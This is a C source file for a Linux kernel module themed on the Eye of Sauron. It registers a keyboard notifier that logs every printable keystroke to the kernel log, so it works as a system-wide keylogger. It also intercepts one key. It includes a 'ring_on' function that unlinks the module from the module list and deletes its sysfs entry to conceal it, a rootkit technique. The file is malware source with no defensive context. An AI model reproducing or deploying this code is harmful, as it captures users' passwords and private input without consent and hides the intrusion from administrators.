#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/notifier.h>

/* Kernel Module License */
MODULE_AUTHOR("geno");
MODULE_LICENSE("GPL");

/* Global Variables */
static struct list_head *_module_list = NULL;
static struct kobject *_kobj          = NULL;
static struct kobject *_kobj_parent   = NULL;
static struct attribute_group *_kgrp  = NULL;

/* Funcion Prototypes */
static int start_eye(void);
static void end_eye(void);
static int sauron_notify(struct notifier_block *nb, unsigned long code, void *data);

module_init(start_eye);
module_exit(end_eye);

static struct notifier_block _sauron =
{
    .notifier_call = sauron_notify,
    .priority = 99
};

static int start_eye(void)
{
    register_keyboard_notifier(&_sauron);
    printk("The Eye of Sauron is upon you.\n");

    return 0;
}

static void end_eye(void)
{
    unregister_keyboard_notifier(&_sauron);
    printk("You are free from the Eye.\n");
}

static int sauron_notify(struct notifier_block *nb, unsigned long code, void *raw_data)
{
    struct keyboard_notifier_param *data = raw_data;
    char c = data->value;

    if (code == KBD_KEYSYM && data->down)
    {
        if (c == 0x01)
            printk("\n");
        else if (c >= 0x20 && c < 0x7f)
            printk(KERN_CONT "%c", c);
    }
    else if (code == KBD_KEYCODE && data->down)
    {
        if (c == 0x2d)
        {
            printk(KERN_CONT "bad_x");
            return NOTIFY_STOP;
        }
    }

    return NOTIFY_OK;
}

void ring_on(void)
{
    _module_list = __this_module.list.prev;         /* Remember location in module list */
    list_del_init(&__this_module.list);             /* Remove from procfs */
    _kobj = &__this_module.mkobj.kobj;              /* Remember kobject */
    _kgrp = &(__this_module.sect_attrs->grp);       /* Remember sysfs group */
    _kobj_parent = __this_module.mkobj.kobj.parent; /* Remember kobject parent */
    kobject_del(&__this_module.mkobj.kobj);         /* Remove from sysfs */

    printk("The ring of power is applied.\n");
}
